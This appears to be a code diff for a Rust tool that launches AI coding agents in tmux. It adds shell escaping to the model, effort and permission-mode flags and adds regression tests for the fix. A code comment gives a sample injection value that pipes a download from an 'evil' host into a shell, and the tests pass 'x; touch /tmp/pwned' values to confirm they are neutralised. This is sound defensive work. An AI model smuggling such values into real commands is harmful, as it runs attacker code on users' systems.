@@ -904,6 +904,13 @@ impl SessionManager {
 /// `"default"` mode is treated as a no-op — the Claude CLI uses its own
 /// default when the flag is absent. Effort has no equivalent no-op value
 /// (its levels are `high`/`medium`/`low`), so all values are passed through.
+///
+/// Every folded value is single-quoted via [`shell_escape_single_quote`]
+/// because the result becomes the tmux `new-session` shell command (run by
+/// `/bin/sh -c`). Without escaping, a value such as `x; curl evil | sh` would
+/// execute in the pane shell before the harness starts. Quoting a
+/// metacharacter-free token (`opus`, `high`, `plan`) is behaviour-neutral to
+/// both the shell and the harness's argument parsing.
 pub fn program_with_agent_flags(
     program: &str,
     mode: Option<&str>,
@@ -917,16 +924,19 @@ pub fn program_with_agent_flags(
         if let Some(m) = mode
             && m != "default"
         {
-            flags.push(format!("--permission-mode {m}"));
+            flags.push(format!(
+                "--permission-mode '{}'",
+                shell_escape_single_quote(m)
+            ));
         }
         if let Some(e) = effort {
-            flags.push(format!("--effort {e}"));
+            flags.push(format!("--effort '{}'", shell_escape_single_quote(e)));
         }
     }
     if kind.supports_model_flag()
         && let Some(m) = model
     {
-        flags.push(format!("--model {m}"));
+        flags.push(format!("--model '{}'", shell_escape_single_quote(m)));
     }
 
     if flags.is_empty() {
@@ -1036,7 +1046,7 @@ mod lifecycle_tests {
     fn claude_flags_effort_only() {
         assert_eq!(
             program_with_agent_flags("claude", None, Some("high"), None),
-            "claude --effort high"
+            "claude --effort 'high'"
         );
     }
 
@@ -1044,7 +1054,7 @@ mod lifecycle_tests {
     fn claude_flags_mode_only() {
         assert_eq!(
             program_with_agent_flags("claude", Some("auto"), None, None),
-            "claude --permission-mode auto"
+            "claude --permission-mode 'auto'"
         );
     }
 
@@ -1052,7 +1062,7 @@ mod lifecycle_tests {
     fn claude_flags_both() {
         assert_eq!(
             program_with_agent_flags("claude", Some("plan"), Some("low"), None),
-            "claude --permission-mode plan --effort low"
+            "claude --permission-mode 'plan' --effort 'low'"
         );
     }
 
@@ -1068,7 +1078,7 @@ mod lifecycle_tests {
     fn claude_flags_preserves_existing_args() {
         assert_eq!(
             program_with_agent_flags("claude --resume", Some("auto"), Some("high"), None),
-            "claude --permission-mode auto --effort high --resume"
+            "claude --permission-mode 'auto' --effort 'high' --resume"
         );
     }
 
@@ -1097,7 +1107,7 @@ mod lifecycle_tests {
     fn model_flag_injected_for_claude() {
         assert_eq!(
             program_with_agent_flags("claude", None, None, Some("opus")),
-            "claude --model opus"
+            "claude --model 'opus'"
         );
     }
 
@@ -1105,7 +1115,7 @@ mod lifecycle_tests {
     fn model_flag_injected_for_codex() {
         assert_eq!(
             program_with_agent_flags("codex", None, None, Some("gpt-5")),
-            "codex --model gpt-5"
+            "codex --model 'gpt-5'"
         );
     }
 
@@ -1113,7 +1123,7 @@ mod lifecycle_tests {
     fn model_flag_combines_with_claude_only_flags() {
         assert_eq!(
             program_with_agent_flags("claude", Some("plan"), Some("high"), Some("opus")),
-            "claude --permission-mode plan --effort high --model opus"
+            "claude --permission-mode 'plan' --effort 'high' --model 'opus'"
         );
     }
 
@@ -1129,7 +1139,7 @@ mod lifecycle_tests {
     fn model_flag_injected_for_opencode() {
         assert_eq!(
             program_with_agent_flags("opencode", None, None, Some("anthropic/claude-sonnet-4-5")),
-            "opencode --model anthropic/claude-sonnet-4-5"
+            "opencode --model 'anthropic/claude-sonnet-4-5'"
         );
         // Claude-only flags are ignored for OpenCode.
         assert_eq!(
@@ -1139,8 +1149,58 @@ mod lifecycle_tests {
                 Some("high"),
                 Some("anthropic/claude-sonnet-4-5")
             ),
-            "opencode --model anthropic/claude-sonnet-4-5"
+            "opencode --model 'anthropic/claude-sonnet-4-5'"
         );
+    }
+
+    #[test]
+    fn model_flag_shell_escapes_injection() {
+        // A malicious --model value must be neutralized: its metacharacters
+        // land inside a single-quoted region so the `/bin/sh -c` that runs the
+        // launch command cannot execute them.
+        let cmd = program_with_agent_flags("claude", None, None, Some("x; touch /tmp/pwned"));
+        assert!(
+            cmd.contains("--model 'x; touch /tmp/pwned'"),
+            "injection payload must be single-quoted: {cmd}"
+        );
+        assert!(
+            !cmd.contains("--model x; touch"),
+            "payload must not appear unquoted: {cmd}"
+        );
+    }
+
+    #[test]
+    fn effort_flag_shell_escapes_injection() {
+        let cmd = program_with_agent_flags("claude", None, Some("x; touch /tmp/pwned"), None);
+        assert!(
+            cmd.contains("--effort 'x; touch /tmp/pwned'"),
+            "injection payload must be single-quoted: {cmd}"
+        );
+        assert!(
+            !cmd.contains("--effort x; touch"),
+            "payload must not appear unquoted: {cmd}"
+        );
+    }
+
+    #[test]
+    fn mode_flag_shell_escapes_injection() {
+        let cmd = program_with_agent_flags("claude", Some("x; touch /tmp/pwned"), None, None);
+        assert!(
+            cmd.contains("--permission-mode 'x; touch /tmp/pwned'"),
+            "injection payload must be single-quoted: {cmd}"
+        );
+        assert!(
+            !cmd.contains("--permission-mode x; touch"),
+            "payload must not appear unquoted: {cmd}"
+        );
+    }
+
+    #[test]
+    fn agent_flags_escape_embedded_single_quote() {
+        // A value containing a single quote must be escaped so it cannot break
+        // out of the surrounding single-quote region.
+        let cmd = program_with_agent_flags("claude", None, None, Some("o'pus"));
+        assert_eq!(cmd, "claude --model 'o'\\''pus'");
     }
 
     // --- program_with_session_name ---
